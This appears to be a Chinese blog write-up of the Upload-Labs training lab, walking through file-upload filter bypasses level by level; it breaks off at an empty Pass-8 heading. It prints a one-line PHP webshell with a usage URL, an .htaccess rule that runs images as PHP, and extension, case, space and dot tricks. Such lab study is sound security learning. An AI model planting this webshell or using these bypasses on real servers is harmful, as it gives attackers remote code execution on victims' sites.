---
layout: post
title: "Uplode-Labs通关笔记"
date: 2019-4-8 20:49:43
author: co0ontty
categories: CTF WEB ALL
tags: CTF WEB ALL 
describe: 根据Uplode-Labs总结文件上传绕过技巧 
cover: 'https://i.loli.net/2019/04/08/5cab11a102167.png'
---

## 漏洞类型分析
![漏洞类型分析](https://i.loli.net/2019/04/08/5caafd2f23ed2.png)
## 漏洞类型判断    
![思路图](https://i.loli.net/2019/04/08/5caafa634c7f7.png)  
## 简单shell制作  
shell.php  
```php
<?php assert($_GET["cmd"])?>
```
使用方法：  
http://104.36.68.99/upload/shell.php?cmd=phpinfo();  
## Pass-1  （前端JS判断）
使用burp进行抓包直接上传webshell，发现在没有数据传输的情况下判定为不合规文件这说明在客户端通过JS进行判断   

[![屏幕快照 2019-04-08 16.58.50.png](https://i.loli.net/2019/04/08/5cab0e218624d.png)](https://i.loli.net/2019/04/08/5cab0e218624d.png)
[![屏幕快照 2019-04-08 16.59.04.png](https://i.loli.net/2019/04/08/5cab0e2234de6.png)](https://i.loli.net/2019/04/08/5cab0e2234de6.png)
[![屏幕快照 2019-04-08 16.59.06.png](https://i.loli.net/2019/04/08/5cab0e22e9b1e.png)](https://i.loli.net/2019/04/08/5cab0e22e9b1e.png)

将图中标红色的1.php改为1.png  

[![屏幕快照 2019-04-08 17.00.48.png](https://i.loli.net/2019/04/08/5cab0e1fc6cfd.png)](https://i.loli.net/2019/04/08/5cab0e1fc6cfd.png)

成功上传，执行shell   

[![屏幕快照 2019-04-08 17.12.25.png](https://i.loli.net/2019/04/08/5cab108972e22.png)](https://i.loli.net/2019/04/08/5cab108972e22.png)

### 大佬教的骚操作：
禁用本页JS，直接上传   
[![01-1.png](https://i.loli.net/2019/04/09/5cabf54fdd3de.png)](https://i.loli.net/2019/04/09/5cabf54fdd3de.png)  

## Pass-2  （服务器端端后缀判断）

使用burp抓包上传1.php，网页发送数据，burp获得流量，可以判断为服务器端响应。  
①将文件后缀修改为jpg后上传，再将1.png修改为1.php,成功上传    
②上传1.php，将包文件中的 Content-Type: 修改为 image/jpeg 成功上传   
最终达到的效果为：
[![屏幕快照 2019-04-09 08.52.37.png](https://i.loli.net/2019/04/09/5cabece6799fe.png)](https://i.loli.net/2019/04/09/5cabece6799fe.png)  
可以判断为服务器端检查文件类型  
## Pass-3（白名单-.phtml、.php5）
将1.php的后缀修改为jpg进行上传，抓包修改后缀上传提示错误   
[![屏幕快照 2019-04-09 09.02.22.png](https://i.loli.net/2019/04/09/5cabef6455bba.png)](https://i.loli.net/2019/04/09/5cabef6455bba.png)
证明服务器端检查后缀   
尝试上传任意后缀文件（php语言除了可以解析以php为后缀的文件，还可以解析phtml、php2，php3、php4、php5这些后缀的文件。） 

上传成功，证明使用的检查模式为黑名单检查。  

## Pass-4 （白名单-.htaccess)
本题目为JS前端判断后缀，服务端黑名单过滤数据。  
后端未过滤".htaccess"文件，上传".htaccess"文件，文件内容为
```php
<FilesMatch "03.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
该代码文件将03.jpg解析为php文件  
[![屏幕快照 2019-04-09 19.53.36.png](https://i.loli.net/2019/04/09/5cac893e518c1.png)](https://i.loli.net/2019/04/09/5cac893e518c1.png)
上传成功后，上传图片马03.jpg ，运行成功    
[![屏幕快照 2019-04-09 19.55.50.png](https://i.loli.net/2019/04/09/5cac8971e083b.png)](https://i.loli.net/2019/04/09/5cac8971e083b.png)  
## Pass-5 （未区分大小写）
Pass-4中存在以下代码：  
```php
 $file_ext = strtolower($file_ext); //转换为小写
```
而Pass-5中没有，说明Pass-5虽然过滤了所有的文件后缀，但是没有区分大小写。
上传shell.PHP即可绕过  
## Pass-6  
相比于第五关的过滤条件缺少了
```php
 $file_ext = trim($file_ext); //首尾去空
```
所以通过构造文件名+后缀+空格进行绕过，即"shell.php "
## Pass-7  
缺少"."过滤代码：
```php
$file_name = deldot($file_name);//删除文件名末尾的点
```
所以通过构造shell.php.进行绕过  
## Pass-8 

